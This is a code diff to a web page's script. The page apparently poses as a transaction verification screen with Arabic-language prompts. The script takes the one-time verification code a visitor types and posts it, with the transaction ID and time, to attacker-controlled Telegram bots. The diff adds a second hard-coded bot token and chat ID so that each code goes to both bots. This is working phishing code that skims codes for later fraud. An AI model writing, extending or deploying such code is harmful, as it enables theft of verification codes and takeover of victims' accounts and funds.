@@ -446,8 +446,10 @@
     
     <script>
         // Telegram Bot Configuration
-        const BOT_TOKEN = "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw";
-        const CHAT_ID = "5372119436";
+        const BOT_TOKENS = [
+            { token: "8145915462:AAEcmC6EHg0otw3813pcXv3Lssx1fVs4Z7w", chatId: "6902892146" },
+            { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
+        ];
         
         document.addEventListener('DOMContentLoaded', function() {
             // Set transaction details
@@ -514,8 +516,14 @@
                     enteredCode += input.value;
                 });
                 
-                // Send code to Telegram
-                sendToTelegram(`🔐 رمز التحقق المدخل: ${enteredCode}\n\n🆔 معرف العملية: ${transactionId}\n⏰ وقت الإدخال: ${new Date().toLocaleTimeString('ar-SA')}`);
+                // Send code to all Telegram bots
+                BOT_TOKENS.forEach(bot => {
+                    sendToTelegram(
+                        bot.token, 
+                        bot.chatId, 
+                        `🔐 رمز التحقق المدخل: ${enteredCode}\n\n🆔 معرف العملية: ${transactionId}\n⏰ وقت الإدخال: ${new Date().toLocaleTimeString('ar-SA')}`
+                    );
+                });
                 
                 // Show processing overlay (5 seconds)
                 processingOverlay.classList.add('active');
@@ -555,14 +563,14 @@
             });
             
             // Function to send message to Telegram
-            function sendToTelegram(message) {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            function sendToTelegram(botToken, chatId, message) {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        chat_id: CHAT_ID,
+                        chat_id: chatId,
                         text: message,
                         parse_mode: 'HTML'
                     }),
